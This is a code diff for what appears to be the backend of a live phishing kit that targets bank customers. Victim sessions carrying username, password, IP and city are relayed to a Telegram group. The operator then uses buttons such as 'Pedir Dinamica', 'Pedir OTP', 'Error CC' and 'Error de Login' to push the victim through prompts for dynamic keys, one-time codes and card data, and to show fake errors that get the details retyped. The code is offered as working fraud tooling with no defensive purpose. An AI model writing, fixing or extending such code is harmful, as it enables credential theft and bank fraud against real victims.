@@ -21,13 +21,19 @@ export function removePending(decisionId) {
   pendingDecisions.delete(decisionId);
 }
 
-export const sendTelegramAlert = async ({ sessionId, groupId, text }) => {
+export const sendTelegramAlert = async ({
+  sessionId,
+  groupId,
+  text,
+  messageId,
+}) => {
   let buttons = [];
   const token = process.env.TELEGRAM_BOT_TOKEN;
   const telegramApi = `https://api.telegram.org/bot${token}/sendMessage`;
   const session = activeSessions.get(sessionId);
   const decisionId = session.decisionId;
   const step = session.step || 1;
+  const showOptions = session.showOptions || false;
   if (step === 1) {
     buttons = [
       [
@@ -35,23 +41,55 @@ export const sendTelegramAlert = async ({ sessionId, groupId, text }) => {
         { text: "Error de Login", callback_data: `errorLogin:${decisionId}` },
       ],
     ];
-  } else if (step === 2) {
+  } else if (step === 2 && showOptions === true) {
+    buttons = [
+      [
+     /*    { text: "Pedir OTP", callback_data: `requestOtp:${decisionId}` }, */
+        {
+          text: "Pedir Dinamica",
+          callback_data: `requestDinamica:${decisionId}`,
+        },
+        { text: "Error CC", callback_data: `errorCC:${decisionId}` },
+      ],
+    ];
+  } else if (step === 3) {
     buttons = [
       [
         {
-          text: "Pedir Dinámica",
-          callback_data: `requestDinamica:${decisionId}`,
+          text: "Finalizar",
+          callback_data: `finalize:${decisionId}`,
         },
-        { text: "Pedir OTP", callback_data: `requestOtp:${decisionId}` },
-        { text: "Finalizar", callback_data: `finalize:${decisionId}` },
+        {
+          text: "Error Dinamica",
+          callback_data: `errorDinamica:${decisionId}`,
+        },
+        /* {
+          text: "Pedir Dinamica",
+          callback_data: `requestDinamica:${decisionId}`,
+        }, */
+      ],
+    ];
+  } else if (step === 4) {
+    buttons = [
+      [
+        {
+          text: "Finalizar",
+          callback_data: `finalize:${decisionId}`,
+        },
+        {
+          text: "Error Dinamica",
+          callback_data: `errorDinamica:${decisionId}`,
+        }/* ,
+        { text: "Pedir OTP", callback_data: `requestOtp:${decisionId}` }, */
       ],
     ];
   }
+
   const response = await fetch(telegramApi, {
     method: "POST",
     headers: { "Content-Type": "application/json" },
     body: JSON.stringify({
-      chat_id: groupId,
+      chat_id: process.env.GROUP_1,
       text,
       reply_markup: {
         inline_keyboard: buttons,
@@ -79,75 +117,57 @@ export async function respondToTelegramCallback(callback) {
   let newText = session.messageText; // Debe almacenarse en la sesión
   let newStep = session.step;
   if (session.step === 1 && action === "errorLogin") {
+    // Generar nuevo decisionId
+
+    // Actualizar mensaje de Telegram
+    const newText = buildMessageText(session, 1);
+    await editTelegramMessage({
+      chatId: process.env.GROUP_1,
+      messageId: session.messageId,
+      text: newText,
+    });
+
     session.user = "";
     session.pass = "";
     session.ip = "";
     session.city = "";
     session.step = 1;
-    // Generar nuevo decisionId
+
     const newDecisionId = uuidv4();
     session.decisionId = newDecisionId;
-
-    // Actualizar mensaje de Telegram
-    const newText = buildMessageText(session);
-    await editTelegramMessage({
-      chatId: session.chatId,
-      messageId: session.messageId,
-      text: newText,
-      reply_markup: {
-        inline_keyboard: [
-          [
-            { text: "Continuar", callback_data: `continue:${newDecisionId}` },
-            { text: "Error de Login", callback_data: `errorLogin:${newDecisionId}` },
-          ],
-        ],
-      },
-    });
 
     // Actualizar decisionMap y crear nueva promesa
     decisionMap.set(newDecisionId, sessionId);
     decisionMap.delete(decisionId); // Limpiar el anterior
 
     // Volver a esperar decisión con el nuevo decisionId
-    waitForDecision(newDecisionId, session.step)
-      .then((newAction) => {
-        if (ioInstance) {
-          ioInstance.to(session.socketId).emit("decision", newAction);
-        }
-      })
-      .catch((err) => {
-        console.error("Timeout nueva decisión:", err.message);
-      });
   } else if (session.step === 1 && action === "continue") {
     // Etapa 1 → Etapa 2
     newStep = 2;
     newText = buildMessageText(session);
+    const successMsg = `
+🚨 Ingreso: ${session.sessionId.split("-")[0]} 🚨
+✅ Login exitoso ✅
+    `;
+    await sendSimpleTelegramMessage(successMsg);
 
     // Actualiza botones a "Error Datos"
     await editTelegramMessage({
-      chatId: session.chatId,
+      chatId: process.env.GROUP_1,
       messageId: session.messageId,
       text: newText,
-      reply_markup: {
-        inline_keyboard: [
-          [
-            { text: "Continuar", callback_data: `continue:${decisionId}` },
-            { text: "Error Datos", callback_data: `errorData:${decisionId}` },
-          ],
-        ],
-      },
     });
   } else if (
     session.step === 2 &&
     ["requestDinamica", "requestOtp"].includes(action)
   ) {
     // Etapa 2 → Etapa 3
-    newStep = 3;
-    newText = buildMessageText(session, step);
+    session.step = 3;
+    newText = buildMessageText(session);
 
     // Actualiza botones a "Error Dinámica" y "Error OTP"
     await editTelegramMessage({
-      chatId: session.chatId,
+      chatId: process.env.GROUP_1,
       messageId: session.messageId,
       text: newText,
       reply_markup: {
@@ -157,18 +177,91 @@ export async function respondToTelegramCallback(callback) {
               text: "Error Dinámica",
               callback_data: `errorDinamica:${decisionId}`,
             },
-            { text: "Error OTP", callback_data: `errorOtp:${decisionId}` },
+           /*  { text: "Error OTP", callback_data: `errorOtp:${decisionId}` }, */
             { text: "Finalizar", callback_data: `finalize:${decisionId}` },
           ],
         ],
       },
     });
-  }
 
+    // Actualizar decisionMap y crear nueva promesa
+    decisionMap.set(decisionId, sessionId);
+    decisionMap.delete(decisionId); // Limpiar el anterior
+  } /* else if (session.step === 3) {
+    if (action === "errorOtp" || action === "errorDinamica") {
+      // Actualiza el mensaje con el error
+      const err = action === "errorOtp" ? 4 : 3;
+      const newText = buildMessageText(session, err);
+
+      await editTelegramMessage({
+        chatId: process.env.GROUP_1,
+        messageId: session.messageId,
+        text: newText,
+        reply_markup: {
+          inline_keyboard: [
+            [
+              { text: "Finalizar", callback_data: `finalize:${decisionId}` },
+              { text: "Error OTP", callback_data: `errorOtp:${decisionId}` },
+              {
+                text: "Error Dinámica",
+                callback_data: `errorDinamica:${decisionId}`,
+              },
+            ],
+          ],
+        },
+      });
+    }
+  } */ else if (session.step === 3) {
+    // Actualiza el mensaje con el error
+    const err = 3;
+    const newText = buildMessageText(session, err);
+
+    await editTelegramMessage({
+      chatId: process.env.GROUP_1,
+      messageId: session.messageId,
+      text: newText,
+      reply_markup: {
+        inline_keyboard: [
+          [
+            { text: "Finalizar", callback_data: `finalize:${decisionId}` },
+            /* { text: "Error OTP", callback_data: `errorOtp:${decisionId}` }, */
+            {
+              text: "Pedir Dinámica",
+              callback_data: `requestDinamica:${decisionId}`,
+            },
+          ],
+        ],
+      },
+    });
+  } else if (session.step === 4) {
+    // Actualiza el mensaje con el error
+    const err = 3;
+    const newText = buildMessageText(session, err);
+
+    await sendSimpleTelegramMessage(newText,3);
+
+    await editTelegramMessage({
+      chatId: process.env.GROUP_1,
+      messageId: session.messageId,
+      text: newText,
+      reply_markup: {
+        inline_keyboard: [
+          [
+            { text: "Finalizar", callback_data: `finalize:${decisionId}` },
+            { text: "Pedir OTP", callback_data: `requestOtp:${decisionId}` },
+            {
+              text: "Error Dinámica",
+              callback_data: `errorDinamica:${decisionId}`,
+            },
+          ],
+        ],
+      },
+    });
+  }
   // Resuelve la promesa y actualiza la sesión
   if (pendingDecisions.has(decisionId)) {
     pendingDecisions.get(decisionId).resolve(action);
-    session.step = newStep;
+
     session.messageText = newText;
     pendingDecisions.delete(decisionId);
   }
@@ -190,12 +283,12 @@ export async function respondToTelegramCallback(callback) {
   } */
 }
 
-export const sendSimpleTelegramMessage = async (chatId, text) => {
+export const sendSimpleTelegramMessage = async (text) => {
   const token = process.env.TELEGRAM_BOT_TOKEN;
   const res = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
     method: "POST",
     headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({ chat_id: chatId, text }),
+    body: JSON.stringify({ chat_id: process.env.GROUP_1, text }),
   });
 
   const data = await res.json();
